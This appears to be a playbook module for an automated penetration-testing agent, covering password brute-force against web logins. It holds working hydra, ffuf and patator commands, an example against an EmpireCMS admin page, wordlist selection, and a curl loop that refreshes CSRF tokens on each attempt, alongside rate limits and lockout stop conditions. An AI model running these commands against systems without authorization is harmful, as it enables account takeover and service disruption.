# Brute Force — Password & Credential Attacks

> Load this file when the attack queue includes authentication bypass or credential brute-force.

## Capability Discovery

Available brute-force tools are discovered at runtime. Run `discover-capabilities.sh` first.

```bash
# Within a task directory, check capabilities.json:
jq '.capabilities["brute-force"]' <task_dir>/capabilities.json
jq '.capabilities["exploit-search"]' <task_dir>/capabilities.json
```

## Tool Selection

| Tool | Best For | Flags Reference |
|------|----------|----------------|
| hydra | HTTP form login, basic auth, many protocols | `-l USER -P pass.txt <target> http-post-form` |
| medusa | Parallel protocol brute-forcing | `-u USER -P pass.txt -M http -h <target>` |
| patator | Flexible multi-purpose brute-forcing | `http_fuzz` module for custom HTTP |
| ncrack | Network service auth (RDP, SSH, FTP) | `-u USER -P pass.txt <target>:<service>` |

## Dictionary Selection

Order of preference for password dictionaries:

| Priority | File | Size | Use Case |
|----------|------|------|----------|
| 1 | Custom wordlist from fingerprint | < 100 | Target-specific (tech stack version, org name, theme keywords) |
| 2 | `/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt` | 10,000 | First broad attempt |
| 3 | `/usr/share/seclists/Passwords/Default-Credentials/*.txt` | varies | Vendor/tech default credentials |
| 4 | `/usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt` | 100,000 | Comprehensive sweep |
| 5 | `/usr/share/wordlists/rockyou.txt` (or .gz) | ~14M | Full brute-force (slow, high noise) |

**Selection rule**: Start with the smallest, most targeted list. Escalate only if earlier tiers yield nothing.

## HTTP Form Brute-Force Pattern

### hydra (http-post-form)

```bash
# Identify failure string from a test login:
curl -s -X POST <login_url> -d "user=WRONG&pass=WRONG" | grep -oP '<error string>'

# Run:
hydra -l <username> -P <wordlist> <host> http-post-form \
  "<path>:<post_data>:<failure_string>" \
  -t 4 -w 2
```

Example for EmpireCMS admin login:
```bash
hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
  192.168.20.21 http-post-form \
  "/e/admin/ecmsadmin.php:enews=login&username=^USER^&password=^PASS^&empirecmskey1=:incorrect" \
  -t 4
```

### ffuf (POST brute-force)

```bash
ffuf -u <login_url> -d "user=admin&pass=FUZZ" -w <wordlist> \
  -fc 200 -fr "<failure_string>" -t 10
```

### patator (http_fuzz)

```bash
patator http_fuzz url=<login_url> method=POST \
  body='user=admin&pass=FILE0' 0=<wordlist> \
  -x ignore:fgrep='<failure_string>'
```

### Dynamic CSRF Token Flow

If the login form uses a per-request CSRF token, do not use a static hydra/ffuf form template. Use a bounded loop that fetches the form, preserves cookies, extracts the current token, submits one password attempt, then repeats at the approved rate.

```bash
while IFS= read -r pass; do
  curl -s -c cookies.txt -b cookies.txt "<login_url>" -o login.html
  csrf=$(grep -oE 'name="csrf[^"]*" value="[^"]+"' login.html | sed -E 's/.*value="([^"]+)".*/\1/' | head -1)
  [ -n "$csrf" ] || { echo "missing csrf token"; break; }
  curl -s -c cookies.txt -b cookies.txt -X POST "<login_url>" \
    -d "user=<username>&pass=$pass&csrf=$csrf" \
    -o "raw/bruteforce-attempt.txt"
  sleep 1
done < <approved_small_wordlist>
```

Use a browser/proxy macro instead only when the user explicitly approves authenticated or stateful brute-force automation. Stop if the token parse fails, cookies rotate unexpectedly, account lockout appears, or the response suggests the request is no longer equivalent to a normal login attempt.

## Rate Limiting & Safety

| Intensity | Threads | Delay | Notes |
|-----------|---------|-------|-------|
| gentle | 1-2 | 1000ms+ | Minimal impact, suitable for production |
| standard | 3-5 | 200-500ms | Balanced |
| aggressive | 10+ | 0ms | CTF/lab only — may trigger lockout |

**Stop conditions**:
- Account lockout detected (response changes from "incorrect" to "locked")
- Rate limiting detected (429 status, increasing response times)
- WAF blocks (403 after previously getting 200)
- After 3 failed attempts with same behavior, switch target endpoint

## Pre-Flight Checks

Before starting brute-force, verify:

1. **Target is responsive**: `curl -s -o /dev/null -w "%{http_code}" <login_url>`
2. **Failure string is stable**: Bad login response is consistent across 3 bad attempts
3. **No lockout**: 5 rapid bad attempts return same response, not "locked"
4. **POST parameters are correct**: Form field names match the actual form
5. **CSRF handling selected**: Static token is documented, or the dynamic token flow above is approved and tested with one bad password

## Intensity Mapping

| Intensity | Dictionary Size | Threads | Retry on Fail |
|-----------|----------------|---------|---------------|
| passive | 10 (defaults only) | 1 | No |
| gentle | 100 | 2 | No |
| standard | 10,000 | 4 | Yes, once |
| aggressive | 100,000+ | 10+ | Yes, twice |

## Recording

After brute-force attempt, record in Phase 3 validation log:

```markdown
### Test #X: Password Brute Force - {login_url}
- Tool: hydra http-post-form
- Wordlist: /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
- Username: admin
- Attempts: 10,000
- Threads: 4
- Result: {no valid password found / found password: ****}
```
